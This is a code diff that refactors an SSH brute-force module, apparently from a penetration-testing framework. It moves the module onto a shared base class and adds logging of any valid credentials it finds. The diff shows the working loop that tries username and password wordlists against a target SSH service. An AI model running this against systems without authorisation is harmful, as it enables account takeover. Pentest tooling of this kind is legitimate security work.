@@ -5,19 +5,24 @@ from helpers.colours import plus, minus, warning, info
 from tabulate import tabulate
 import os
 import ipaddress
+from modules.module import Module
 
-class SSHBruteforce(object):
 
-    def __init__(self):
+class SSHBruteforce(Module):
 
+    def __init__(self, *args, **kwargs):
+
+        super().__init__(*args, **kwargs)
+        
+        self.log_file = args[0]
         self.wordlist = [] 
 
         self.info = {
-
             'Name': 'SSH Bruteforce',
             'Author': ' Alessandro Cara',
-            'Description': 'Bruteforce SSH service'
+            'Description': 'Bruteforce SSH service by trying all possible username/password combinations'
             }
+
         self.options = {
             'Port': {
                 'Description': 'Port on which SSH is running',
@@ -80,21 +85,6 @@ class SSHBruteforce(object):
 
         return True
 
-    def print_options(self):
-        table = []
-        for key, value in self.options.items():
-
-            table.append([key, value['Description'], value['Value'], value['Required']])
-
-        print(tabulate(table, headers=["Option", "Description", "Value", "Required"], tablefmt="grid"))
-
-    def print_info(self):
-        table = []
-        for key, value in self.info.items():
-            table.append([key, value])
-
-        print(tabulate(table, headers=["Info", "Value"], tablefmt="grid"))
-
     def parse_wordlist(self, path):
         try:
             with open(path) as wd:
@@ -126,24 +116,24 @@ class SSHBruteforce(object):
                 try:
                     client.connect(self.options['Ip']['Value'], port=self.options['Port']['Value'], username=self.options['Username']['Value'], password=word, timeout=0.5, allow_agent=False, look_for_keys=False)
                     plus("Valid credentials found %s:%s" % (self.options['Username']['Value'], word))
+                    self.log_to_file("Valid credentials found %s:%s" % (self.options['Username']['Value'], word))
                     return
                 except Exception:
                     pass
 
-        for username in username_wordlist:
-            for word in password_wordlist:
-                try:
-                    client.connect(self.options['Ip']['Value'], port=self.options['Port']['Value'], username=username, password=word, timeout=0.5, allow_agent=False, look_for_keys=False)
-                    plus("Valid credentials found %s:%s" % (username, word))
-                    creds.append(username + ":" + word)
-                    break
+        else:
+            for username in username_wordlist:
+                for word in password_wordlist:
+                    try:
+                        client.connect(self.options['Ip']['Value'], port=self.options['Port']['Value'], username=username, password=word, timeout=0.5, allow_agent=False, look_for_keys=False)
+                        plus("Valid credentials found %s:%s" % (username, word))
+                        creds.append(username + ":" + word)
+                        self.log_to_file("Valid credentials found %s:%s" % (username, word))
+                        break
 
-                except Exception:
-                    pass
+                    except Exception:
+                        pass
 
         if not creds:
             minus("Could not find any valid credentials")
-
-
-
-
+            self.log_to_file("Could not find any valid credentials")
